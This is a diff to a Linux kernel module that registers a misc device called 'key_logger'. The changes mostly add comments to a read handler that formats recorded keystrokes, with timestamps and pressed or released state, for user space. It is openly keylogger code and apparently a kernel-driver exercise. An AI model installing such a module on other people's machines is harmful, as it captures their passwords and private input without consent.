@@ -10,7 +10,6 @@ const struct file_operations	f_ops = {
 	.open = misc_open,
 	.release = misc_release,
 	.read = misc_read,
-	/*.write = misc_write,*/
 };
 
 extern t_key	*first;
@@ -34,24 +33,29 @@ static ssize_t		misc_read(struct file *filp, char *buffer, size_t length, loff_t
 	char	buff[128] = {0};
 	size_t	len	= 0;
 
+	// browse the list, convert elem in formated string and store it in a buffer
 	while (tmp) {
 		sprintf(buff, "%.2lu:%.2lu:%.2lu, %12s, (%02d), %s\n",
 				(tmp->time.tv_sec / 3600) % (24), (tmp->time.tv_sec / 60) % (60),
 				tmp->time.tv_sec % 60, tmp->name, tmp->key, tmp->state ? "pressed" : "released");
 
+		// alloc or realloc buffer
 		if (log == NULL) {
 			log = (char *)kcalloc(strlen(buff) + 1, sizeof(char), GFP_KERNEL);
 		} else {
 			log = (char *)krealloc(log, strlen(log) + strlen(buff) + 1, GFP_KERNEL);
 		}
+		// if kmalloc or krealloc fail return -1
 		if (log == NULL)
 			return -1;
 
+		// concat to large buffer
 		log = strcat(log, buff);
 
 		tmp = tmp->next;
 	}
 
+	// check if log buffer contain something before print and free
 	if (log != NULL) {
 		len = simple_read_from_buffer(buffer, length, offset, log, strlen(log));
 		kfree(log);
@@ -64,10 +68,12 @@ int	create_misc(void)
 {
 	int	retval;
 
+	// init struct
 	misc_device.minor = MISC_DYNAMIC_MINOR;
 	misc_device.name = "key_logger";
 	misc_device.fops = &f_ops;
 
+	// register device
 	retval = misc_register(&misc_device);
 	if (retval == -1) {
 		pr_err("misc_register() failure\n");
